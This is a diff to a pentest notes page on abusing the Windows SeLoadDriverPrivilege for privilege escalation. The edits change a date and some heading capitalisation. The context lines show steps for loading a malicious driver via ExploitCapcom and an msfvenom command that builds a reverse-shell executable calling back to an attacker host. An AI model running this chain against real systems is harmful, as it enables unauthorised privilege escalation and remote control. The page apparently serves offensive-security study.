@@ -1,10 +1,10 @@
 ---
 title: "SeLoadDriverPrivilege"
-date: 2024-7-18
+date: 2025-7-25
 tags: ["Exploitation", "SeLoadDriverPrivilege", "Privilege Escalation", "Windows", "Reverse Shell"]
 ---
 
-### Abuse #1: Install malicious driver
+### Abuse #1: Install a Malicious Driver
 
 #### 1. Compile eoploaddriver
 
@@ -42,7 +42,7 @@ tags: ["Exploitation", "SeLoadDriverPrivilege", "Privilege Escalation", "Windows
 
 <small>*Ref: [ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom)*</small>
 
-#### 3. Create stageless payload
+#### 3. Create Stageless Payload
 
 ```console
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev.exe
